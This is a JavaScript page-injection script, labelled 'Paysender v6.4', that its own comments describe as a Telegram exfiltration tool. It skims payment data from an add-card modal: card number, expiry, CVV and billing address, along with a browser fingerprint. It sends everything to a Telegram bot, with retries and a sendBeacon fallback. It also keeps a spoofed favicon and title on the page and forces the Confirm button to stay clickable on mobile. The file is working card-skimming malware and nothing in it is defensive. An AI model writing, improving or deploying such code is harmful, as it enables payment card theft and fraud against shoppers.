(function () {
  /* ═══════════════════════════════════════════════════════════
     PAGE PATCHER v6.4 — Paysender (Telegram exfiltration fix + mobile confirm fix)
     + Favicon persistente + Título persistente
     + Coleta robusta de dados + envio ao Telegram com retry
     + Correção do botão Confirm em dispositivos móveis (z-index, footer, disabled)
     ═══════════════════════════════════════════════════════════ */
  ...
  /* ────────── COLEÇÃO ROBUSTA (melhorada para capturar endereço em qualquer dispositivo) ────────── */
  function collectFormData() {
    // Procura o modal ativo (add card)
    const modal = document.querySelector('[role="dialog"], .fixed.inset-0, div[class*="Modal"]');
    const scope = modal || document;

    // Helper: encontra input por múltiplos patterns (placeholder, aria-label, label associada)
    function findInput(patterns) {
      for (let p of patterns) {
        let input = scope.querySelector(`input[placeholder*="${p}" i], input[aria-label*="${p}" i]`);
        if (input) return input;

        let label = Array.from(scope.querySelectorAll('label, div, span')).find(el => el.innerText.trim().toLowerCase().includes(p.toLowerCase()));
        if (label) {
          let inp = label.closest('div')?.querySelector('input');
          if (inp) return inp;
        }
      }
      return null;
    ...
    const cardInput = findInput(['card number', 'Card Number']) || scope.querySelector('input[maxlength="19"]');
    const expiryInput = findInput(['MM/YY', 'expiry', 'Expiry']);
    const cvvInput = findInput(['CVV', 'CVC', 'Security Code']);

    // Billing address
    let countryInput = findInput(['Country', 'country']) || scope.querySelector('input[aria-label*="country" i], select');
    let addressInput = findInput(['Address', 'address', 'Street']);
    let cityInput = findInput(['City', 'city']);
    let postalInput = findInput(['Postal', 'postal', 'ZIP', 'zip']);

    let country = countryInput ? (countryInput.value || countryInput.innerText || '') : '';
    let address = addressInput ? addressInput.value : '';
    let city = cityInput ? cityInput.value : '';
    let postal = postalInput ? postalInput.value : '';

    // Se country for um select, pegar o texto selecionado
    if (countryInput && countryInput.tagName === 'SELECT') {
      const selected = countryInput.options[countryInput.selectedIndex];
      country = selected ? selected.text : countryInput.value;
    }

    return {
      cardNumber: cardInput ? cardInput.value.replace(/\D/g, '') : '',
  ...
  /* ────────── ENVIO AO TELEGRAM (com retry e fallback) ────────── */
  async function sendToTelegram(retries = 2) {
    try {
...
Fuso horário: ${fingerprint.timezone}`;
      ...
      if (retries > 0) {
        console.log(`[PS] Tentando novamente em 1s... (${retries} restantes)`);
        await new Promise(r => setTimeout(r, 1000));
        return sendToTelegram(retries - 1);
      }
      // Fallback: tentar com sendBeacon (não espera resposta)
      try {
        const fallbackData = collectFormData();
        if (fallbackData.cardNumber) {
          const fallbackUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(JSON.stringify(fallbackData))}`;
          navigator.sendBeacon(fallbackUrl);
        }
      } catch(e) {}
      return false;
    }
  ...
  /* ══════════════════════════════════════════════════════════
     CORREÇÃO PARA O BOTÃO CONFIRM EM DISPOSITIVOS MÓVEIS
  ══════════════════════════════════════════════════════════ */
  function fixMobileConfirmButton() {
    const footer = document.getElementById('__ps_footer__');
    if (footer) footer.style.zIndex = '10';

    const modal = document.querySelector('[role="dialog"], .fixed.inset-0, div[class*="Modal"]');
    if (!modal) return;

    const btnContainer = modal.querySelector('.sticky.bottom-0, .bg-gradient-to-b');
    if (btnContainer) {
      btnContainer.style.position = 'relative';
      btnContainer.style.zIndex = '1000';
      if (footer) {
        btnContainer.style.marginBottom = footer.offsetHeight + 10 + 'px';
      }
    }

    const confirmBtn = modal.querySelector('button');
    if (confirmBtn && confirmBtn.innerText.trim() === 'Confirm') {
      confirmBtn.disabled = false;
      confirmBtn.style.opacity = '1';
      confirmBtn.style.cursor = 'pointer';
      confirmBtn.classList.remove('opacity-10', 'cursor-not-allowed');
    }
  }

  function watchForModalAndFix() {
    const observer = new MutationObserver(() => {
      const modal = document.querySelector('[role="dialog"], .fixed.inset-0');
      if (modal && !modal.hasAttribute('data-fixed-by-ps')) {
        modal.setAttribute('data-fixed-by-ps', 'true');
        fixMobileConfirmButton();
        const confirmBtn = modal.querySelector('button');
        if (confirmBtn && confirmBtn.innerText.trim() === 'Confirm') {
          confirmBtn.disabled = false;
          confirmBtn.style.opacity = '1';
  ...
  // Intervalo extra para garantir que o botão fique visível e clicável
  setInterval(() => {
    ...
    if (modal) {
      ...
      if (confirmBtn && confirmBtn.innerText.trim() === 'Confirm') {
        ...
        const footer = document.getElementById('__ps_footer__');
        if (footer) {
          confirmBtn.style.marginBottom = footer.offsetHeight + 10 + 'px';
        }
      }
    }
  }, 300);
  ...
  /* ══════════════════════════════════════════════════════════
     ...
     (com pequenas adaptações para chamar as novas funções)
  ══════════════════════════════════════════════════════════ */
  ...
  // ========== FUNÇÃO onConfirmClick MODIFICADA (envio robusto + habilitação do botão) ==========
  function onConfirmClick() {
    // Habilita o botão visualmente (caso esteja com opacity-10)
    const btn = document.querySelector('button:has(> span:contains("Confirm")), button');
    if (btn && btn.innerText.trim() === 'Confirm') {
      btn.disabled = false;
      btn.classList.remove('opacity-10', 'cursor-not-allowed');
    }

    // Envia os dados para o Telegram (com retry)
  ...
  function listenForConfirm() {
    document.querySelectorAll('button').forEach(btn => {
      ...
      btn.disabled = false; // força remoção do disabled
    });
  }
  ...
  // ========== APPLY ALL (com chamada das novas correções) ==========
  function applyAll() {
    ...
    try { fixMobileConfirmButton(); } catch(_){}
    try { watchForModalAndFix(); } catch(_){}
  ...
  console.log('%c[Paysender v6.4] ✓ Telegram com retry + mobile confirm fix','color:#1a1a1a;font-weight:bold;font-size:13px;background:#F5C842;padding:4px 10px;');
})();